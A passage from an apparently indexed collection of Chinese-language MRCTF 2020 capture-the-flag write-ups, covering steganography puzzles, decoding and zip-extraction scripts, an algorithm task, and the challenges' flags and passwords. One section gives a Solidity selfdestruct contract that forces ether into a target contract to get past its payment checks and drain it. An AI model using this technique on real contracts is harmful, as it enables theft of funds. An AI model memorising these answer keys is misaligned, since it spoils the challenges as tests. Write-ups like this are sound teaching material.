\u53ea\u6709\u6700\u9ad8\u4e24\u4f4d\u7684\u4e8c\u8fdb\u5236\u6570\u4e0d\u540c \uff0c\u5c06\u5176\u6700\u9ad8\u4e24\u4f4d\u63d0\u53d6\u51fa\u6765\u7ec4\u5408\u5728\u4e00\u8d77\u8f6c\u5316\u4e3aASCII\uff0c\u53ef\u4ee5\u5f97\u5230rar\u5bc6\u7801\uff1a fp = open('out.txt','r') a = fp.readlines() p = [] for i in a: p.append(int(i)) s = '' for i in p: if i == 63: a = '00' elif i == 127: a = '01' elif i == 191: a = '10' elif i == 255: a = '11' s += a import binascii result = '' for i in range(0,len(s),8): result += chr(int(s[i:i+8],2)) print result \u5f97\u5230rar\u5305\u7684\u89e3\u538b\u5bc6\u7801\uff1a 0ac1fe6b77be5dbe \u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2azip\u5305\uff0c\u770bzip\u5305\u91cc\u7684\u5185\u5bb9\u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a docx \u6587\u4ef6\uff0c\u6539\u540e\u7f00\u4e3adocx\u5f97\u5230\u6700\u7ec8\u7684\u6587\u4ef6 \u5c06\u6587\u4ef6\u5185\u5bb9\u5168\u9009\u6539\u4e3a\u6df1\u8272\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u6587\u6863\u7684\u6700\u4e0b\u65b9\u85cf\u6709\u51e0\u4e32\u5b57\u7b26 ps\uff1a\u5982\u679c\u7528word\u6253\u5f00\u7684\u8bdd\u53ef\u4ee5\u770b\u5230\u6709\u6700\u540e\u7684\u6362\u884c\u7b26\u5b58\u5728\uff0c\u53ef\u4ee5\u5224\u65ad\u6587\u6863\u4e2d\u9690\u85cf\u4e86\u5185\u5bb9 \u5c06\u6bcf\u4e00\u957f\u4e32\u7684\u5b57\u7b26\u7528base64\u89e3\u7801\uff0c\u53ef\u4ee5\u5f97\u52306\u884c\u53ea\u7531 0 & 1 \u7ec4\u6210\u7684\u5b57\u7b26\u4e32 \u5728\u6587\u6863\u5de6\u4fa7\uff08word\u548cWPS\u90fd\u53ef\uff09\u67e5\u627e\u5b57\u7b26\u5c31\u53ef\u4ee5\u89c2\u5bdf\u5230flag\uff0c\u5305\u88f9\u4e0a MRCTF{} \u5c31\u662f\u6700\u7ec8\u7684flag flag: MRCTF{He1Lo_mi5c~}","title":"print bitstring.BitArray(bin=bin_result).bytes.encode('hex')"},{"location":"writeup/MRCTF-2020/#iss","text":"SSTV\u6162\u626b\u63cf\u7535\u89c6\u3002 \u65e0\u7ebf\u7535\uff0c\u76f4\u63a5\u7528MMSSTV\u5c31\u80fd\u89e3\u7801\u4e86\u3002 \u8bfb\u51fa\u56fe\u7247\u53d6\u5f97flag\u3002","title":"ISS"},{"location":"writeup/MRCTF-2020/#_1","text":"\u8fd9\u662f\u4e00\u4e2a\u4e0d\u80fd\u900f\u9732\u51fa\u9898\u4eba\u4fe1\u606f\u7684\u9898\u76ee... \u89e3\u6cd51\uff1a\u624b\u52a8\u62fc\u56fe\uff08\u9003 \u89e3\u6cd52\uff1a\u5199\u811a\u672c\u62fc\u56fe\u3002\u901a\u8fc7\u4e00\u4e9b\u65b9\u6cd5\uff08\u6bd4\u5982\u8fb9\u7f18\u7684\u5bf9\u5e94\u50cf\u7d20\u8272\u5dee\u53d6\u5e73\u65b9\u548c\uff09\u8ba1\u7b97\u8fb9\u7f18\u7684\u76f8\u4f3c\u5ea6\uff0c\u5bf9\u6bcf\u4e2a\u56fe\u7247\u5bf9\u8c61dfs\u5176\u56db\u5468\u6700\u76f8\u4f3c\u7684\u56fe\u7247\u5373\u53ef\uff0c\u590d\u6742\u5ea6(n^3)\uff0c2000\u591a\u50cf\u7d20\uff0c\u5e38\u6570\u4e0d\u5927\uff0c\u53ef\u4ee5\u8dd1\u3002 \u5728\u4f7f\u7528PIL\u62fc\u56fe\u7684\u65f6\u5019\u6ce8\u610f\u751f\u6210\u539f\u56fe\u957f\u5bbd\u4e8c\u500d\u7684\u56fe\u7247\uff0c\u4ece\u4e2d\u95f4\u4e00\u70b9\u5f00\u59cb\u6269\u5c55\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u4e0d\u4f1a\u8d8a\u754c\u3002\u6216\u8005\u68c0\u6d4b\u7ea2\u8272\u50cf\u7d20\u70b9\u4f4d\u7f6e\uff0c\u636e\u6b64\u6784\u9020\u8fb9\u7f18\u7279\u5f81\u4e5f\u53ef\u4ee5\uff0c\u4f46\u8fd9\u6837\u5bb9\u6613\u51fa\u73b0\u591a\u4e2a\u5f3a\u8fde\u901a\u5206\u91cf\u7684\u60c5\u51b5\uff0c\u6700\u540e\u8fd8\u8981\u624b\u52a8\u62fc \uff08\u7b97\u6cd5dalao\u8bf7\u52a1\u5fc5\u628a\u811a\u672c\u53d1\u6765\u770b\u770b \u89e3\u6cd53\uff1agayhub\u4e0a\u7684gaps\u5de5\u5177\u3002\u8c37\u6b4c\u641c\u7d22jigsaw solver\u53ef\u4ee5\u627e\u5230\u8fd9\u4e2a\u5de5\u5177\uff0c\u4e24\u79d2\u5c31\u8dd1\u51fa\u6765\u4e86\u3002 \u6ce8\u610f\u5176\u53c2\u6570 -size \u4ee3\u8868\u4e86\u5206\u5272\u6210\u6b63\u65b9\u5f62\u5757\u7684\u8fb9\u957f\u3002\u663e\u7136\u5e94\u8be5\u53d6\u5c0f\u62fc\u56fe\u7684\u957f\u5bbd\u6700\u5927\u516c\u56e0\u6570100","title":"\u4e0d\u7720\u4e4b\u591c"},{"location":"writeup/MRCTF-2020/#unravel","text":"\u9996\u5148\u62ff\u5230\u540ebinwalk\u5206\u79bb\u56fe\u7247\u53d1\u73b0\u5e26\u6709aes\u7684Tokyo \u7136\u540e\u67e5\u770b.wav\u6587\u4ef6\u5c3e\uff0c\u53d1\u73b0\u5bc6\u6587\u3002 \u5229\u7528\u5bc6\u7801\u89e3\u5bc6\u7684\u5f97\u5230\u53e6\u4e00\u4e2a.wav \u901a\u8fc7silenteye\u89e3LSB\u9690\u5199 \u5f97\u5230flag\u3002","title":"Unravel"},{"location":"writeup/MRCTF-2020/#_2","text":"pragma solidity >=0.6.1; contract Modcoin { mapping(uint256 => bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,\"Not Wanted value\"); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 && ((msg.value % 0.001 ether) == 0)), \"Not Accepting These Coins.\"); } } \u539f\u5408\u7ea6\u4e2d\u4e24\u4e2a\u652f\u4ed8\u51fd\u6570 recvpay() \u548c fallback() \u90fd\u53ea\u5141\u8bb8\u63a5\u53d7\u5076\u6570\u500d 0.001 ether \u7684\u4ed8\u6b3e\uff0c\u800c\u5408\u7ea6\u7684 getflag \u51fd\u6570\u5219\u8981\u6c42\u5947\u6570\u500d 0.001 ether \u7684\u5408\u7ea6\u4f59\u989d\u624d\u53ef\u4ee5\u6267\u884c\uff08\u5e76\u6e05\u7a7a\u5408\u7ea6\u4f59\u989d\uff09\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u7ed5\u8fc7\u9650\u5236\u5411\u5408\u7ea6\u5730\u5740\u53d1\u9001ether\uff0c\u800c\u5408\u7ea6\u81ea\u6bc1\u6216\u6316\u77ff\u4ea7\u751f\u7684ether\u662f\u65e0\u6cd5\u62d2\u7edd\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u81ea\u6bc1\u5408\u7ea6\u8fbe\u5230\u6761\u4ef6\u3002 contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); } }","title":"\u98de\u6765\u6a2a\u8d22"},{"location":"writeup/MRCTF-2020/#pyflag","text":"\u9898\u76ee\u7075\u611f\uff1a\u51fa\u9898\u4eba\u611f\u89c9Misc\u5f88\u591a\u9898\u76ee\u6709\u7740\u76f8\u540c\u7684\u5957\u8def\uff0c\u60f3\u8981\u5c1d\u8bd5\u57fa\u4e8e\u7279\u5f81\u7684\u9690\u5199\u81ea\u52a8\u89e3\u51b3\u5de5\u5177...\u4e8e\u662f\u5c31\u6709\u4e86\u9898\u76ee\u7684\u6700\u540e\u4e00\u90e8\u5206 \u62ff\u5230\u9898\u76ee\u89e3\u538b\u7f29\u540e\u53d1\u73b0\u4e09\u5f20\u56fe\u7247\u3002\u65e0\u8bba\u662f\u4f7f\u7528strings\u547d\u4ee4\uff0c\u8fd8\u662f\u752816\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u56fe\u7247\uff0c\u90fd\u53ef\u4ee5\u53d1\u73b0\u6587\u4ef6\u672b\u5c3e\u9690\u85cf\u4e86\u4e00\u4e9b\u4fe1\u606f\u3002strings\u4f1a\u53d1\u73b0[Secret File Part 1-3]\u7684\u6807\u8bc6\uff0c\u800c16\u8fdb\u5236\u6253\u5f00\u5219\u53d1\u73b0\u6587\u4ef6\u5c3e\u7684\u7ed3\u675f\u7b26\u5e76\u975ejpg\u7684\u6807\u51c6\u7ed3\u675f\u7b26 FF D9 \u3002 \u4e8e\u662f\u5c06\u8fd9\u4e09\u6bb5\u9690\u85cf\u4fe1\u606f\u590d\u5236\u523016\u8fdb\u5236\u7f16\u8f91\u5668\u4e2d\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u538b\u7f29\u5305\u3002 \u538b\u7f29\u5305\u5bc6\u7801\u662f\u5f31\u5bc6\u78011234 \u7136\u540e\u53d6\u5f97\u4e86\u4e00\u4e2aflag.txt\uff0c.hint\u5df2\u7ecf\u63d0\u793a\u4e86\u4f7f\u7528base16,32,64,85\u7684\u7f16\u7801\uff0c\u53ef\u4ee5\u7f16\u5199\u81ea\u52a8\u5316\u811a\u672c\u6765\u5904\u7406\uff0c\u4e5f\u53ef\u4ee5\u624b\u52a8\u5c1d\u8bd5\u3002\u53ea\u52a0\u5bc6\u4e86\u4e94\u5c42\uff0c\u624b\u52a8\u5c1d\u8bd5\u4e0d\u4f1a\u5f88\u8017\u8d39\u65f6\u95f4\u3002\u7f16\u5199py\u811a\u672c\u8fd9\u5c31\u9700\u8981\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u77e5\u8bc6\uff0c\u5e76\u638c\u63e1\u8fd9\u4e9b\u7f16\u7801\u7684\u6b63\u5219\u7279\u5f81\u3002 \u5982\u679c\u4f60\u9009\u62e9\u7f16\u5199\u811a\u672c\u89e3\u7801\uff0c\u90a3\u4e48\u8bf7\u6ce8\u610f\u4f7f\u7528\u7684\u51fd\u6570\u4f20\u5165\u7684\u53c2\u6570\u662fstr\uff08\"Astring\"\uff09\u8fd8\u662fbytes(b\"Astring\")\u3002\u5b57\u7b26\u6d41\u548c\u5b57\u8282\u6d41\u7684\u533a\u522b\u4e5f\u5f88\u91cd\u8981\uff0c\u53ef\u4ee5\u53bb\u4e86\u89e3\u4e00\u4e0b\uff0c\u660e\u786e\u5b83\u4eec\u7684\u533a\u522b\u53ef\u4ee5\u8ba9\u4f60\u5728\u6570\u636e\u5904\u7406\u65f6\u66f4\u52a0\u719f\u7ec3\u3002 #!/usr/bin/env python import base64 import re def baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: pass def detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4 def autoDec(text): while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) with open(\"flag.txt\",'rb') as f: flag = f.read() autoDec(flag) \u987a\u4fbf\u7ed9\u51fa\u6211\u7684\u52a0\u5bc6\u811a\u672c #!/usr/bin/env python import base64 import re key = \"31214\" # key\u672c\u6765\u975e\u5e38\u957f\u3002\u3002\u4f3c\u4e4e\u592a\u96be\u4e86\u6539\u7684\u7b80\u5355\u4e86\u70b9 # key = \"14332234124133132214311231\" flag = b\"MRCTF{Y0u_Are_4_p3rFect_dec0der}\" def baseEnc(text,type): if type == 1: return base64.b16encode(text) elif type == 2: return base64.b32encode(text) elif type == 3: return base64.b64encode(text) elif type == 4: return base64.b85encode(text) else: pass def baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: pass def finalEnc(text,key): nf = text count = 1 for i in key: nf = baseEnc(nf,int(i,10)) #print(\"\u7b2c\"+str(count)+\"\u6b21\u52a0\u5bc6: \",nf) count +=1 return nf def finalDec(text,key): nf = text key = key[::-1] print(key) count = 1 for i in key: nf = baseDec(nf,int(i,10)) #print(\"\u7b2c\"+str(count)+\"\u6b21\u89e3\u5bc6: \",nf) count +=1 return nf def detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4 def autoDec(text): print(\"dec key:\",end=\"\") while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) print(str(code),end=\"\") fe = finalEnc(flag,key) with open(\"flag.txt\",'w') as f: f.write(fe.decode()) ''' ff = finalDec(fe,key) print(ff) ''' ff = autoDec(fe) \u6700\u540eflag\u5c31\u662f MRCTF{Y0u_Are_4_p3rFect_dec0der}","title":"pyflag"},{"location":"writeup/MRCTF-2020/#cyberpunk","text":"\u7b7e\u5230\u9898\u3002 \u6539\u65f6\u95f4\u6216\u8005\u9006\u5411\u90fd\u884c\u3002 \u4f46\u662f\u6602\u54e5\u52a0\u4e86\u4e2a\u58f3 \u4f30\u8ba1\u5927\u5bb6\u90fd\u4f1a\u53bb\u6539\u65f6\u95f4\u542723333\u3002","title":"cyberpunk!"},{"location":"writeup/MRCTF-2020/#write-up","text":"\u4e3b\u8981\u8003\u5bdfpython\u811a\u672c\u7f16\u5199\u80fd\u529b \u867d\u7136\u662f\u5343\u5c42\u5957\u5a03\u4f46\u662f\u4e3a\u4e86\u4e0d\u90a3\u4e48\u6bd2\u7624\u5176\u5b9e\u53ea\u6709\u4e24\u5c42 \u7b2c\u4e00\u5c42\uff0c\u81ea\u52a8\u5316\u89e3\u538bzip \u8bd5\u51e0\u6b21\u5c31\u77e5\u9053zip\u7684\u89e3\u538b\u5bc6\u7801\u90fd\u662f\u5bf9\u5e94\u540d\u5b57\uff0c\u53ef\u4ee5\u5199\u811a\u672c #coding=utf-8 import os import zipfile orginal_zip = \"0573.zip\" while True: tag = orginal_zip orginal_zip = zipfile.ZipFile(orginal_zip) for contents in orginal_zip.namelist(): password = contents[0:contents.find('.')] print password orginal_zip.setpassword(tag[:-4]) try: orginal_zip.extractall() except: break if(len(tag)>6): os.system(\"rm \"+tag) orginal_zip=password+\".zip\" \u56e0\u4e3a\u535a\u5ba2\u91cc\u6709\u5199\u8fc7\u76f8\u5e94\u811a\u672c\uff0c\u8fd9\u91cc\u6539\u4e86\u4e0b\uff0c\u89e3\u538b\u5bc6\u7801\u90fd\u662f\u5bf9\u5e94\u540d\u5b57\u800c\u4e0d\u662f\u538b\u7f29\u5305\u91cc\u540d\u5b57\u3002\u6709\u4e2a\u53ef\u80fd\u7684\u5751\u662f\u5982\u679c\u4e0d\u5224\u65ad\u7684\u8bdd\uff0c\u7a0b\u5e8f\u8dd1\u5b8c\u4f1a\u81ea\u52a8\u628aqr.zip\u4e5f\u5220\u4e86 \u7136\u540e\u7b2c\u4e8c\u5c42\u5c31\u662fqr.txt \u91cc\u9762\u4e00\u5806 (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) ... \u663e\u7136\u662f\u50cf\u7d20\u70b9 \u7528PIL\u5e93\u641e\u4e0b #coding=utf-8 from PIL import Image x = 200 #x\u5750\u6807 \u901a\u8fc7\u5bf9txt\u91cc\u7684\u884c\u6570\u8fdb\u884c\u6574\u6570\u5206 y = 200 #y\u5750\u6807 x * y = \u884c\u6570 im = Image.new(\"RGB\", (x, y)) file = open('qr.txt') for i in range(0, x): for j in range(0, y): line = file.readline() #\u83b7\u53d6\u4e00\u884c\u7684rgb\u503c line = line[:-2] line = line[1:] print line rgb = line.split(\", \") #\u5206\u79bbrgb\uff0c\u6587\u672c\u4e2d\u9017\u53f7\u540e\u9762\u6709\u7a7a\u683c im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) im.save('flag.png') \u62ff\u5230\u4e8c\u7ef4\u7801\uff0c\u626b\u4e00\u4e0b\u62ff\u5230flag flag=\"MRCTF{ta01uyout1nreet1n0usandtimes}\"","title":"\u5343\u5c42\u5957\u8def Write Up"},{"location":"writeup/MRCTF-2020/#ezmisc","text":"\u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20png\u56fe\u7247\uff0c\u5728windows\u4e0b\u80fd\u6253\u5f00\u770b\u5230\uff0c\u62d6\u8fdbkali\u4e2d\u4f1a\u663e\u793aCRC error\uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u65ad \u56fe\u7247\u7684\u5bbd\u5ea6/\u9ad8\u5ea6\u6709\u95ee\u9898\uff0c\u53c8\u56e0\u4e3a\u56fe\u7247\u5bbd\u5ea6\u6709\u95ee\u9898\u65f6\u5728windows\u4e0b\u65e0\u6cd5\u6b63\u5e38\u6253\u5f00\u56fe\u7247\uff0c\u6240\u4ee5\u672c\u9898\u4e3a\u56fe\u7247 \u9ad8\u5ea6\u6709\u95ee\u9898\uff0c\u4fee\u6539\u56fe\u7247\u9ad8\u5ea6\u5373\u53ef\u770b\u5230flag\uff1a MRCTF{1ts_vEryyyyyy_ez!} \u9644\u4e0a\u6709\u5173CRC\u9519\u8bef\u7684\u9690\u5199\u5206\u6790\u7f51\u5740\uff1ahttps://www.bbsmax.com/A/gVdnlMVXJW/ ctfwiki\u4e2d\u4e5f\u6709\u5f88\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff1ahttps://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/","title":"ezmisc"},{"location":"writeup/MRCTF-2020/#_3","text":"\u4e0b\u8f7d\u9644\u4ef6\uff0c\u89e3\u538b\u65f6\u62a5\u9519\uff0c\u653e\u8fdbwinhex\u67e5\u770b\uff0c\u53d1\u73b0rar\u6587\u4ef6\u5934\u9519\u8bef\uff0c\u5c06 6152 \u4fee\u6539\u4e3a 5261 \u540e\u518d\u89e3\u538b\uff0c\u5373 \u53ef\u5f97\u5230\u4e00\u4e2aword\u6587\u6863\uff0c\u6253\u5f00\u540e\u53d1\u73b0\u5185\u5bb9\u88ab\u9690\u85cf\uff0c\u641c\u7d22word\u9690\u5199\u53ef\u77e5\u5176\u9690\u5199\u65b9\u5f0f\uff0c\u5c06\u88ab\u9690\u85cf\u7684\u5185\u5bb9\u663e \u793a\u51fa\u6765\uff0c\u5f97\u5230\u4e00\u4e32\u97f3\u7b26\uff0c\u5728\u7ebf\u7f51\u5740\u89e3\u5bc6\u97f3\u7b26\u5373\u53ef\u5f97\u5230flag word\u9690\u5199\u65b9\u5f0f\uff08\u4f9b\u53c2\u8003\uff09\uff1ahttps://blog.csdn.net/q_l_s/article/details/53813971 \u89e3\u5bc6\u7f51\u5740\uff1ahttps://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue flag\uff1a MRCTF{thEse_n0tes_ArE_am@zing~}","title":"\u4f60\u80fd\u770b\u61c2\u97f3\u7b26\u5417"},{"location":"writeup/MRCTF-2020/#algo","text":"","title":"Algo"},{"location":"writeup/MRCTF-2020/#oi","text":"","title":"\u81f4\u656cOI"},{"location":"writeup/MRCTF-2020/#description","text":"\u840c\u65b0\u60f3\u8981\u6574\u7406\u4ed6\u7684\u4f5c\u6218\u62a5\u544a\uff08\u7ecf\u9a8c\uff09\u4e66\u3002 \u840c\u65b0\u6709$n$\u672c\u7ecf\u9a8c\u4e66\uff0c\u5206\u6210\u4e86\u82e5\u5e72\u5806\uff08\u542b\u4e00\u5806\uff09\uff0c\u6bcf\u5806\u7ecf\u9a8c\u4e66\u4e0d\u5c11\u4e8e$l$\u672c\u4e14\u4e0d\u8d85\u8fc7$r$\u672c\u3002 \u840c\u65b0\u5c06\u6240\u6709\u6570\u91cf\u76f8\u540c\u7684\u5806\u5206\u4e3a\u4e00\u7c7b\uff0c\u5e76\u5c06\u5806\u6570\u4e0d\u5c11\u4e8e$k$\u7684\u7c7b\u5206\u522b\u88c5\u7bb1\u5b58\u653e\u3002 \u6240\u6709\u7ecf\u9a8c\u4e66\u90fd\u662f\u4e00\u6837\u7684\u3002 \u840c\u65b0\u60f3\u77e5\u9053\uff0c\u6240\u6709\u5212\u5206\u65b9\u6848\u9700\u8981\u7684\u7bb1\u5b50\u6570\u7684\u603b\u548c\uff08\u5bf9 65536 \u53d6\u6a21\uff09\u3002 \u6bcf\u7ec4\u8be2\u95ee\u5305\u62ec\u56db\u4e2a\u6574\u6570 $n,k,l,r$\u3002\u53ea\u8981\u8ba1\u7b97\u51fa\u840c\u65b0\u7684\u6240\u6709\u8be2\u95ee\uff0c\u5373\u53ef\u5f97\u5230 flag\u3002","title":"Description"},{"location":"writeup/MRCTF-2020/#solution","text":"\u6bd4\u8d5b\u524d\u4e00\u5929\u5f3a\u884c\u9b54\u6539\u4e86\u4e00\u9053\u4ee5\u524d\u51fa\u7684NOIP\u6a21\u62df\u8d5b\u9898\u76ee\u3002\u96be\u5ea6NOIP+\u7701\u9009-\u5427\u3002 \u56e0\u4e3a\u6ca1\u6709\u65f6\u9650\uff0c\u6570\u636e\u8303\u56f4\u6539\u6210\u4e86$10^8$\uff0c$O(n^{1.5})$\u5927\u6982\u8dd1\u534a\u5c0f\u65f6\u4ee5\u5185\u5427\uff08\u6700\u540e\u51e0\u7ec4\u6570\u636e\u8dd1\u4e00\u8d77\u7b97\uff09\u3002 \u8bb0$n$\u6709$p_n$\u79cd\u4e0d\u540c\u7684\u5212\u5206\uff0c\u6570\u5b57$i$\u51fa\u73b0\u81f3\u5c11$k$\u6b21\u7684\u5212\u5206\u6709$p_{n-ik}$\u4e2a\uff0c\u4e00\u4e2a\u5212\u5206\u6b63\u597d\u4f1a\u88ab\u6bcf\u4e2a\u81f3\u5c11\u51fa\u73b0\u4e86$k$\u6b21\u7684\u6570\u5b57\u8ba1\u7b97\u4e00\u6b21\uff0c\u6240\u4ee5\u7b54\u6848\u5c31\u662f$$\\sum_{i=l}^r p_{n-ik}$$ \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(n(r-l))$\u3002 \u5f53$l \\geq \\sqrt{n}$\u65f6\uff0c\u6700\u591a\u53ea\u4f1a\u9009$\\sqrt{n}$\u4e2a\u6570\u3002 $f_{i,j}$\u8868\u793a$j$\u5212\u5206\u4e3a$i$\u4e2a$l$\u81f3$r$\u95f4\u7684\u6570\u4e4b\u548c\u7684\u65b9\u6848\u6570\uff0c\u6709$$f_{i,j}=f_{i,j-i}+f_{i-1,j-l}-f_{i-1,j-i-r}$$ $f_{i,j-i}$\u8868\u793a\u5c06$i$\u4ef6\u7269\u54c1\u603b\u4f53\u79ef\u4e3a$j-i$\u7684\u6240\u6709\u65b9\u6848\u4e2d\u7684\u6240\u6709\u7269\u54c1\u4f53\u79ef\u52a0\u4e00\uff1b $f_{i-1,j-l}$\u8868\u793a\u5c06$i-1$\u4ef6\u7269\u54c1\u603b\u4f53\u79ef\u4e3a$j-l$\u7684\u6240\u6709\u65b9\u6848\u4e2d\u52a0\u5165\u4e00\u4e2a\u4f53\u79ef\u4e3a$l$\u7684\u7269\u54c1\uff1b \u6700\u540e\u518d\u51cf\u53bb\u51fa\u73b0\u4e86\u4f53\u79ef\u4e3a$r+1$\u7684\u7269\u54c1\u7684\u65b9\u6848\u6570\uff0c\u5373$f_{i-1,j-i-r}$\u3002 \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(\\frac{n^2}{l})$\u3002 \u8bbe\u7f6e\u4e00\u4e2a\u9608\u503c$x$\uff0c$f_{i,j}$\u8868\u793a$j$\u5212\u5206\u4e3a$i$\u4e2a$x$\u81f3$r$\u95f4\u7684\u6570\u4e4b\u548c\u7684\u65b9\u6848\u6570\u3002 \u7528\u5b8c\u5168\u80cc\u5305\u6c42\u51fa${f_{0,n}}$\uff0c\u5373$n$\u5212\u5206\u4e3a\u6570\u4e2a$l$\u81f3$x-1$\u4e2d\u6570\u4e4b\u548c\u7684\u65b9\u6848\u6570\uff1b\u518d\u5957\u7528\u89e3\u6cd5\u4e09\u5373\u53ef\u3002 \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(n(x-l)+\\frac{n^2}{x})$\u3002 $x$\u53d6$\\mathcal{O}(\\sqrt{n})$\u65f6\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u6700\u4f18\uff0c\u4e3a$\\mathcal{O}(n^{1.5})$\u3002 #pragma GCC optimize(\"Ofast\") #include <cmath> #include <ctime> #include <cctype> #include <cstdio> #include <cstring> #include <algorithm> using namespace std; typedef unsigned short ushort; const int N = 1e8 + 10; int n, l, r, x, mx; ushort _[2][N], *f = _[0], *g = _[1], p[N]; void init(int n, int l, int r) { auto t0 = time(0); ::n = n, ::l = l, ::r = r; x = min(r + 1, max(l, (int)sqrt(n))); mx = x > r ? 0 : n / x; memset(_, 0, sizeof(_)); memset(p, 0, sizeof(p)); f[0] = 1; for (int i = l; i < x; ++i) { auto t = time(0); double now = 1.0 * i / (x - l + mx); if (t - t0 >= 10) { t0 = t; fprintf(stderr, \"%lf%c completed.\\n\", now * 100, '%'); } for (int j = i; j <= n; ++j) { f[j] += f[j - i]; } } for (int i = 0; i <= n; ++i) { p[i] += f[i]; } for (int i = 1; i <= mx; ++i) { auto t = time(0); double now = 1.0 * (x - l + i) / (x - l + mx); if (t - t0 >= 10) { t0 = t; fprintf(stderr, \"%lf%c completed.\\n\", now * 100, '%'); } swap(f, g); memset(f, 0, sizeof(ushort) * x * i); for (int j = x * i; j <= n; ++j) { f[j] = f[j - i] + g[j - x]; j - r - i >= 0 ? f[j] -= g[j - r - i] : 0; p[j] += f[j]; } } } ushort solve(int n, int k, int l, int r) { if (n != ::n || l != ::l || r != ::r) { init(n, l, r); } ushort ans = 0; for (int i = l, t = min(1ll * k * l, n + 1ll); i <= r && t <= n; ++i, t += k) { ans += p[n - t]; } return ans; } int main() { freopen(\"in.txt\", \"r\", stdin); int n, k, l, r, length = 0; char flag[100] = \"\"; while (scanf(\"%d%d%d%d\", &n, &k, &l, &r) != EOF) { auto &&ans = solve(n, k, l, r); flag[length++] = ans >> 8; flag[length++] = ans & 255; printf(\"flag = %s\\n\", flag); } return 0; } \u4ee5\u4e0b\u4e24\u79cd\u89e3\u6cd5\u6539\u4e86\u6a21\u6570\u540e\u6211\u6ca1\u60f3\u8fc7\uff0c\u4e0d\u77e5\u9053\u80fd\u4e0d\u80fd\u5199\u3002","title":"Solution"},{"location":"writeup/MRCTF-2020/#_4","text":"\u8003\u8651\u751f\u6210\u51fd\u6570\u3002\u8bb0$P(x)$\u4e3a${p_n}$\u7684\u666e\u901a\u578b\u751f\u6210\u51fd\u6570\uff0c\u6709 $$P(x)=\\prod_{i=l}^r \\frac{1}{1-x^i}$$ \u8bb0$$G(x)=\\sum_{i=0}^{\\infty} g_i x^i=\\prod_{i=l}^r (1-x^i)$$ \u5219\u6709$P(x)=G^{-1}(x)$\uff0c\u82e5\u6c42\u51fa$G(x)$\uff0c\u591a\u9879\u5f0f\u6c42\u9006\u5143\u5373\u53ef\u6c42\u51fa$P(x)$\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c${g_n}$\u4e3a\u7269\u54c1\u4f53\u79ef\u4e3a$l$\u81f3$r$\u768401\u80cc\u5305\u7684\u5076\u6570\u4e0e\u5947\u6570\u4ef6\u7269\u54c1\u7684\u65b9\u6848\u6570\u4e4b\u5dee\u3002 \u663e\u7136\u81f3\u591a\u9009$\\mathcal{O}(\\sqrt{n})$\u4ef6\u7269\u54c1\u3002\u4ee4$h_{i,j}$\u8868\u793a$i$\u4ef6\u7269\u54c1\u603b\u4f53\u79ef\u4e3a$j$\u7684\u65b9\u6848\u6570\uff0c\u6709$$h_{i,j}=h_{i,j-i}+h_{i-1,j-(i-1)-l}-h_{i-1,j-r-1}$$ \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(n^{1.5} + n \\log n)$\u3002","title":"\u89e3\u6cd5\u4e8c"},{"location":"writeup/MRCTF-2020/#_5","text":"\u7b2c\u4e09\u7c7b\u6b27\u62c9\u53d8\u6362 \u3002 $$P(x) = \\prod_{i=1}^{\\infty} \\frac{1}{(1-x^i)^{a_i}}$$ \u8bb0$A(x)$\u4e3a${a_n}$\u7684\u666e\u901a\u578b\u751f\u6210\u51fd\u6570\uff0c\u6709 $$P(x) = \\exp \\left(\\sum_{i=1}^{\\infty} \\frac{A(x^i)}{i} \\right)$$ \u65f6\u95f4\u590d\u6742\u5ea6$O(n \\log n)$\u3002","title":"\u89e3\u6cd5\u4e09"},{"location":"writeup/MRCTF-2020/#o","text":"\u95ee\u9898\u662fn\u4e2ak\u5bf9\uff081e9+7\uff09\u53d6\u6a21\u7684\u503c 